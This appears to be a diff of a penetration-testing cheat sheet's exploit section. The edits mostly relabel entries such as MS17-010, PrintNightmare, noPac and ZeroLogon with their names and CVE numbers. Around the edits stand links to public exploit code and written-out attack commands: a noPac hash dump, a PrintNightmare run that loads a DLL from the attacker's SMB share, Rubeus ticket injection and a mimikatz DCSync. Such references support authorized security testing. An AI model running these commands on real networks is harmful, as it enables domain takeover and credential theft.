@@ -3017,7 +3017,7 @@ https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/
 #14. - Exploits
 -----------------------------------------
 
-- MS17-010
+- EternalBlue - MS17-010
 
 ```
 https://github.com/worawit/MS17-010/blob/master/zzz_exploit.py
@@ -3026,13 +3026,13 @@ https://github.com/helviojunior/MS17-010/blob/master/send_and_execute.py
 https://github.com/3ndG4me/AutoBlue-MS17-010
 ```
 
-- MS08-067
+- NetAPI32 - MS08-067
 
 ```
 https://github.com/jivoi/pentest/blob/master/exploit_win/ms08-067.py
 ```
 
-- CVE-2007-2447
+- Samba Username Map Script - CVE-2007-2447
 
 ```
 https://github.com/amriunix/CVE-2007-2447
@@ -3044,13 +3044,13 @@ https://github.com/amriunix/CVE-2007-2447
 https://github.com/flast101/php-8.1.0-dev-backdoor-rce
 ```
 
-- CVE-2021-4034
+- PwnKit - CVE-2021-4034
 
 ```
 https://github.com/joeammond/CVE-2021-4034/blob/main/CVE-2021-4034.py
 ```
 
-- NoPac
+- NoPac - CVE-2021-42278 & CVE-2021-42287
 
 ```
 https://github.com/Ridter/noPac
@@ -3059,7 +3059,7 @@ $ sudo python3 noPac.py <domain>/<username>:<password> -dc-ip <IP address> -dc-h
 $ sudo python3 noPac.py <domain>/<username>:<password> -dc-ip <IP address> -dc-host <hostname> --impersonate administrator -use-ldap -dump -just-dc-user <domain>/administrator
 ```
 
-- PrintNightmare
+- PrintNightmare - CVE-2021-34527
 
 ```
 https://github.com/cube0x0/CVE-2021-1675
@@ -3070,7 +3070,7 @@ $ sudo smbserver.py -smb2support CompData /path/to/backupscript.dll
 $ sudo python3 CVE-2021-1675.py <domain>/<username>:<password>@<IP address> '\\<IP address>\CompData\backupscript.dll'
 ```
 
-- PetitPotam
+- PetitPotam - CVE-2021-36942
 
 ```
 https://github.com/topotam/PetitPotam
@@ -3088,17 +3088,23 @@ C:\> .\Rubeus.exe asktgt /user:<machine account>$ /<base64 certificate>=/ptt
 mimikatz # lsadump::dcsync /user:<domain>\krbtgt
 ```
 
-- CVE-2019-1040
+- PrinterBug - CVE-2019-1040
 
 ```
 https://github.com/itzvenom/Security-Assessment-PS
 https://github.com/NotMedic/NetNTLMtoSilverTicket
 ```
 
-- MS14-068
+- Microsoft Kerberos Checksum Validation Vulnerability - MS14-068
 
 ```
 https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068/pykek
+```
+
+- ZeroLogon - CVE-2020-1472
+
+```
+https://github.com/dirkjanm/cve-2020-1472
 ```
 
 #15. - Exploit Research
